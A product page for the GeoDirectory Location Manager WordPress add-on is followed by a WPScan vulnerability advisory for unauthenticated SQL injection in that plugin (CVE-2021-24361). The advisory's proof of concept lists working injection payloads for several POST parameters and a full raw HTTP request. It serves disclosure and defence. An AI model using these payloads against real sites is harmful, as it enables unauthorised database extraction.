=== Content from wpgeodirectory.com_b4da81ed_20250114_214155.html ===


 [GeoDirectory](https://wpgeodirectory.com/)

# Location Manager[2.3.20](https://wpgeodirectory.com/downloads/location-manager/?changelog=1)

## Go global adding Countries, Regions, Cities and Neighborhoods to your directory

 Single Site – $49.00 2 - 5 Sites – $69.00 Unlimited Sites – $99.00
Buy Now[Checkout](https://wpgeodirectory.com/checkout/?nocache=true)
[Buy Membership](/downloads/membership/)

Added to cart

Get all Official Addons and **save 90%**

![Location Manager](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/11/location-manager900x600-720x480.png)

## Your Global Business Directory

If your directory website covers more than one city, you’ll need the Location Manager Add-on. The Core Plugin that we offer free on WordPress.org allows submitting listings only within 1 location (City, Town, or Village). With the Location Manager, you can expand your directory and go global!

* **Unlimited locations.** – With the GeoDirectory Locations Manager add-on, you can create unlimited locations for your listings.
* **No need to prefill locations.** – Save heaps of time by not having to prefill locations. Locations populate while a user adds a listing. Google API or Open Street Maps get the correct details.
* **Location-specific directory, no problem.** – Location Manager can limit listing to any locations. 3 Countries, 5 Regions, 12 cities? No Problem.
* **SEO friendly locations pages.** – Every location page can have its very own meta info, text description, and featured image. By default, we use a general global meta info with replacement variables (%%location\_name%%).
* **Yoast SEO Sitemap Support.** – Using the Yoast SEO plugin? GeoDirectory will automatically generate sitemaps for your locations.

![Location Manager Location Settings](data:image/svg+xml...)![Location Manager Location Settings](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/12/location-maanger-manage-locations-720x537.png)

## Our Smart Location Switcher

A core part of any multi-location directory is, being able to switch between locations, our smart location switcher makes it very easy.

* **Automatic location suggestions based on your location.** – Opening the location switcher presents a list of nearest cities based on proximity to your location. Users will always have the most relevant suggestions.
* **AJAX-based location suggestions.** – Start typing the location you want to view, and we will AJAX search for any stored locations in the database.
* **Fallback proximity search.** – If a search returns zero results from your location database, we will; Automatically geocode the search text; Provide lists of location suggestions from the Google API or OSM API; Let the user do a proximity search for that location. So even if a location is not in your database, you can still show listings nearest to the users’ search.
* **Saved search history.** – Opening the location switcher again will show recent search results for quick access.
* **Location switcher where you want it.** – The switcher can be accessed in many ways, the easiest of which is a menu item. Our GeoDirectory menu items include the switcher, use it in any position on any menu. The switcher can also be shown via a shortcode, widget, or block and is page builder friendly.
* **REST API.** – All location queries made by the location switcher are via the WordPress REST API, meaning requests are faster, future proof, and developer-friendly.

![Smart Location Switcher](data:image/svg+xml...)![Smart Location Switcher](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/12/location-switcher.png)

## Smart Location Searches

* **Smart location searches.** – The Near field of the directory search bar has the same intelligent geo-location features of the location switcher. Location searches are quick and easy for your users.
* **Show the current location.** – The search bar will show the current location. Users know precisely where they are searching. Merely hovering over the field will display an X that can clear the field and let the user search for a new location.
* **Location-aware URLs.** – “Near me” searches always contain the GPS in the URL. Selecting near me from the location switcher will result in a pretty permalink that is easy to share with friends: /location/near/me/39.952371,-75.163601/
* **Location-aware autocompletes.** – When paired with our Advanced Search addon, the location manager can filter AJAX search suggestions to be limited to the current location only (or set to search all locations depending on your directory needs)

![Location Manager Near Search](data:image/svg+xml...)![Location Manager Near Search](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/12/location-manager-near-search-720x268.png)

## Advanced Near Me Filtering

* **Mobile phone GPS support.** – When doing a near search on mobile, GPS improves accuracy.
* **HTML5 Geolocation Support.** – Asking users to share their location in the browser (HTTPS Required) provides far greater accuracy than old-style IP geolocation.
* **Fallback Map Pin Support.** – If HTML5 geolocation fails or is denied, the user will be presented with a map to be able to drag a pin to the location they wish to search. This map automatically centers on the geolocation of the IP request, meaning it will never be far off the user’s actual location.

![Near me manually set location](data:image/svg+xml...)![Near me manually set location](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/12/Near-me-manual-location.png)

## Location Manager Widgets

( all our widgets can be used as either a shortcode, widget or block and are page builder friendly )

* **Location Switcher.** – Our location switcher lets users filter the site by database location, near me, or proximity to any location.
* **Locations.** – This widget outputs either a list or image grid of the locations on your site. Results can be limited to a specific area and can use ajax paging.
* **Near Me Button.** – Show a button anywhere that will take the user to a location page showing listings closest to the user.
* **Location Description.** – Display the current location description. Used to show a custom description for a location page, edit this under each location in the admin area.

![Location Manager Widgets](data:image/svg+xml...)![Location Manager Widgets](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/12/location-manager-shortcodes-720x464.png)

## Simplified Admin Controls

* **Search Locations.** – Native WordPress table views mean you can effortlessly search and find the locations you want.
* **Duplicate locations Merging.** – Similar locations can end up in your database, either through user spelling or a bad import name. We have a tool that lets you merge these two locations, automatically fixing all permalinks for the listings affected.
* **A quick snapshot of numbers.** – See exactly how many listings you have in a Country, Region, or City.

![Location Manager Country Settings](data:image/svg+xml...)![Location Manager Country Settings](https://ayecode.b-cdn.net/wp-content/uploads/edd/2019/12/location-manager-country-settings-720x383.png)

 Single Site – $49.00 2 - 5 Sites – $69.00 Unlimited Sites – $99.00
Add to Cart[Checkout](https://wpgeodirectory.com/checkout/?nocache=true)

Added to cart

* ## Addon Details

  Included in [membership](https://wpgeodirectory.com/downloads/membership/)?:

  Developer:

  GD Team

  Version:

  [2.3.20](https://wpgeodirectory.com/downloads/location-manager/?changelog=1)
* ## Pricing

   Single Site – $49.00 2 - 5 Sites – $69.00 Unlimited Sites – $99.00
  Add to Cart[Checkout](https://wpgeodirectory.com/checkout/?nocache=true)

  Added to cart

  Number of items in cart: 0

  + Your cart is empty.
  + Subtotal: $0.00
  + Estimated Tax: $0.00
  + Total: $0.00
  + [Checkout](https://wpgeodirectory.com/checkout/?nocache=true)

  (All price options are in USD and billed yearly unless stated otherwise. You may cancel your
  subscription at any time. Addons subject to yearly license for support and updates.)
* ## Requirements

  WordPress:
  4.7 or higher

  Core Plugin:
  2.1 or higher

  PHP:
  5.6 or higher
* ## Documentation

  [Addon Documentation](https://docs.wpgeodirectory.com/category/28-location-manager)

  [Core Documentation](https://docs.wpgeodirectory.com)

  [Getting Started Guide](https://docs.wpgeodirectory.com/collection/1-getting-started)

  [View Changelog](https://wpgeodirectory.com/downloads/location-manager/?changelog=1)
* ## Support

  Need help? Submit a [support request.](https://wpgeodirectory.com/support/)
* ## Translations

  [Get/Add Translations.](https://www.wpgeodirectory.com/translate/projects/geodirlocation)

  Translate core OR all addons and receive one year free membership!
  ( [T&C's apply](https://wpgeodirectory.com/support/topic/translate-geodirectory-and-get-1-year-free/#post-41611) )

##### Get the bundle and save **90%**

Only $229, including 1 year of support, updates and all new products released.

[Get Membership](/downloads/membership/)

(Shorter plans available at lower initial cost)

![Money Back Guarantee](data:image/png;base64...)
##### 30 day money back guarantee!

### AyeCode Ltd

* [About](https://wpgeodirectory.com/about/)
* [Careers](https://wpgeodirectory.com/careers/)
* [Affiliate Area](https://wpgeodirectory.com/your-account/affiliate-area/)
* [UsersWP](https://userswp.io)
* [GetPaid Plugin](https://wpgetpaid.com)

### Get in Touch

* [Contact Us](https://wpgeodirectory.com/contact-us/)
* [Facebook](https://www.facebook.com/directory.plugin.for.wordpress)
* [Twitter](https://twitter.com/wpgeodirectory)
* [GitHub](https://github.com/GeoDirectory/)
* [WordPress.org](https://wordpress.org/plugins/geodirectory/ "GeoDirectory – WordPress Business Directory Plugin, or Classified Directory")

### Support

* [Documentation](https://docs.wpgeodirectory.com)
* [Contact Support](https://wpgeodirectory.com/support/)
* [Videos](https://www.youtube.com/channel/UC1i6wQt-OC_59LDG439Q6mA/videos)
* [Translations](https://wpgeodirectory.com/translate/projects)
* [Hire an Expert](https://geodirectoryexperts.com)

### Legal

* [Terms and Conditions](https://wpgeodirectory.com/terms-and-conditions/)
* [Privacy Policy](https://wpgeodirectory.com/privacy-policy/)
* [Support Policy](https://wpgeodirectory.com/support-policy/)
* [Refund Policy](https://wpgeodirectory.com/refund-policy/)
* [GDPR](https://wpgeodirectory.com/contact-form/)

© Copyright AyeCode Ltd 2025

##### Login to your account

×

Username or Email Address

Password

Remember Me

Connect with
  ![Sign in with Google](data:image/svg+xml...)![Sign in with Google](https://ayecode.b-cdn.net/wp-content/themes/ayetheme-new/assets/img/btn_google_signin_dark_normal_web.png)

Enter your WordPress.com blog URL

http://.wordpress.com

Proceed

Login
Register
|
Forgot Password

##### Forgot Password

×

Email Address

Get new password

##### Register your account

×

First Name

Last Name

Username

Email Address

Password

Connect with
  ![Sign in with Google](data:image/svg+xml...)![Sign in with Google](https://ayecode.b-cdn.net/wp-content/themes/ayetheme-new/assets/img/btn_google_signin_dark_normal_web.png)

Enter your WordPress.com blog URL

http://.wordpress.com

Proceed

Register

×
##

Get the latest news, tips, and exclusive content directly in your inbox.

Name

Email

Get my discount

#### WooHoo!

Confirm your email address, and instantly receive the discount code :)

**20% Discount Offer**

×

Hurry! Get your 20% discount before it expires.
[Get 20% Discount](/downloads/membership/?discount-code=8HPYX974B)

##### Changelog

×

```

								Loading Changelog...
```

×

×
This website uses cookies.
Find out more [privacy policy](/privacy-policy/).



=== Content from wpscan.com_1be71cb3_20250114_214159.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# GeoDirectory Location Manager < 2.1.0.10 - Multiple Unauthenticated SQL Injections

### Description

In the plugin, the AJAX action gd\_popular\_location\_list did not properly sanitise or validate some of its POST parameters, which are then used in a SQL statement, leading to unauthenticated SQL Injection issues.

The prerequisite to exploiting this vulnerability is finding a page on the vulnerable site which uses affected functionality. Even if the site uses the affected plugin, it has to include the file `/wp-content/plugins/geodir\_location\_manager/includes/widget-functions.php` which includes that action in the site. That page creates a `\_nonce` variable which is validated by the script to be a valid one. In the time of writing. I did not find a way to bypass that check.

### Proof of Concept

Exploiting the issue requires valid `wpinv\_session\_\*` cookie, so proper `\_nonce` value is generated.
First vulnerable parameter is `order\_by` which lacks any sanitization against SQL attacks. While it should take value ASC or DESC to indicate sort direction, it is possible to inject any arbitrary value in the query. That can be abused to retrieve data from the database by using boolean-based blind SQL injection technique.
Example request parameters that are vulnerable to `order\_by` parameter SQL injection:
action=gd\_popular\_location\_list&\_nonce=7fd12c11d7&geodir\_ajax=true&pageno=2&scatts={"title":"","what":"city","slugs":"","output\_type":"grid","fallback\_image":false,"per\_page":4,"pagi\_t":false,"pagi\_b":true,"pagi\_info":"","no\_loc":false,"show\_current":false,"country":"","region":"","city":"","country\_val":"","region\_val":"","city\_val":"","order\_by":",(SELECT+1+FROM+wp\_users+WHERE+1%3d0)+asc"}
These should be sent as a POST request to `/wp-admin/admin-ajax.php` endpoint.
Different response is returned when condition changes from `1=1` to `1=0` which indicates successful SQL injection. Any valid table with more than one entry works in this particular PoC.
Obviously valid `\_nonce` vale also has to be provided here.
Another vulnerable parameter is `country\_non\_restricted` Example request parameters:
action=gd\_popular\_location\_list&\_nonce=7fd12c11d7&geodir\_ajax=true&pageno=2&scatts={"title":"","what":"city","slugs":"","output\_type":"grid","fallback\_image":false,"per\_page":4,"pagi\_t":false,"pagi\_b":true,"pagi\_info":"","no\_loc":false,"show\_current":false,"country":"","region":"","city":"","country\_val":"","region\_val":"","city\_val":"","country\_non\_restricted":"country)+AND+1=0--+"}
It also leads to boolean-based SQL injection and can be abused as before.
Similar parameter to this one is also `region\_non\_restricted`. It has extra prerequisite, that `what` parameter has to have value “region” in order to include it in query. Example request:
action=gd\_popular\_location\_list&\_nonce=7fd12c11d7&geodir\_ajax=true&pageno=2&scatts={"title":"","what":"region","slugs":"","output\_type":"grid","fallback\_image":false,"per\_page":4,"pagi\_t":false,"pagi\_b":true,"pagi\_info":"","no\_loc":false,"show\_current":false,"country":"","region":"","city":"","country\_val":"","region\_val":"","city\_val":"","region\_non\_restricted":"region)+AND+1=1--+"}
Last one from similar parameters is `city\_non\_restricted` - here “city” value needs to be present in `what` parameter. Request:
action=gd\_popular\_location\_list&\_nonce=7fd12c11d7&geodir\_ajax=true&pageno=2&scatts={"title":"","what":"city","slugs":"","output\_type":"grid","fallback\_image":false,"per\_page":4,"pagi\_t":false,"pagi\_b":true,"pagi\_info":"","no\_loc":false,"show\_current":false,"country":"","region":"","city":"","country\_val":"","region\_val":"","city\_val":"","city\_non\_restricted":"city)+AND+1=1--+"}
Next vulnerable parameter is `what` which is used in `GROUP BY` part of query. It also can be used to exfiltrate data using boolean-based injection. For that, easiest way to abuse it seems to induce runtime error on one of the conditions - which can be something like `EXP(720)` mentioned here (https://www.exploit-db.com/docs/english/37953-mysql-error-based-sql-injection-using-exp.pdf)
action=gd\_popular\_location\_list&\_nonce=7fd12c11d7&geodir\_ajax=true&pageno=2&scatts={"title":"","what":"(SELECT+CASE+WHEN+1%3d1+THEN+1+ELSE+exp(720)+END)--+","slugs":"","output\_type":"grid","fallback\_image":false,"per\_page":4,"pagi\_t":false,"pagi\_b":true,"pagi\_info":"","no\_loc":false,"show\_current":false,"country":"","region":"","city":"","country\_val":"","region\_val":"","city\_val":""}
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: vulnerable-site.com
Accept: \*/\*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 394
Connection: close
Cookie: wpinv\_session\_4d770309287a90030b86817a1c5cbe3f=a4010a77bb280cacd86afe13b405f6ff%7C%7C1621499174%7C%7C1621495574%7C%7Cdef9b2ee7cb7852ceabfcff7eff6f5a4
Pragma: no-cache
Cache-Control: no-cache
action=gd\_popular\_location\_list&\_nonce=7fd12c11d7&geodir\_ajax=true&pageno=2&scatts={"title":"","what":"(SELECT+CASE+WHEN+1%3d1+THEN+1+ELSE+exp(720)+END)--+","slugs":"","output\_type":"grid","fallback\_image":false,"per\_page":4,"pagi\_t":false,"pagi\_b":true,"pagi\_info":"","no\_loc":false,"show\_current":false,"country":"","region":"","city":"","country\_val":"","region\_val":"","city\_val":""}

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

geodir\_location\_manager](https://a8cteam5105.wordpress.com/plugin/geodir_location_manager/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.1.0.10

### References

CVE
[CVE-2021-24361](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24361)

URL
<https://wpgeodirectory.com/downloads/location-manager/>

### Classification

Type
SQLI

OWASP top 10
[A1: Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection)

CWE
[CWE-89](https://cwe.mitre.org/data/definitions/89.html)

CVSS
[9.0 (critical)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H)

### Miscellaneous

Original Researcher
Rafal Goryl

Submitter
Rafal Goryl

Submitter twitter
[voix44er](//twitter.com/voix44er)

Verified
Yes

WPVDB ID
[5aff50fc-ac96-4076-a07c-bb145ae37025](https://a8cteam5105.wordpress.com/vulnerability/5aff50fc-ac96-4076-a07c-bb145ae37025/)

### Timeline

Publicly Published
2021-06-04 (about 3 years ago)

Added
2021-06-04 (about 3 years ago)

Last Updated
2021-06-25 (about 3 years ago)

### Other

Published
Title

Published
2024-08-01
Title
[Salon booking system < 10.8 - Authenticated (Administrator+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/33a5fd05-981b-4e89-bf3e-a4e8a2de2827/)

Published
2013-01-21
Title
[WordPress Poll <= 34.05 - SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/d1ac2780-d66b-4b4a-803d-7a3e358890a2/)

Published
2023-12-21
Title
[E2Pdf < 1.20.24 - Authenticated(Administrator+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/e7119faa-0ff9-4a48-9f96-301fd8421499/)

Published
2024-04-09
Title
[WP Activity Log Premium < 4.6.4.1 - Authenticated (Subscriber+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/2b6e9be4-1518-41e4-b69a-5ce697e68386/)

Published
2024-10-13
Title
[ShortPixel Image Optimizer < 5.6.4 - Authenticated (Editor+) SQL Injection](https://a8cteam5105.wordpress.com/vulnerability/8ba1b268-59ac-4dcb-8743-ac137454b433/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

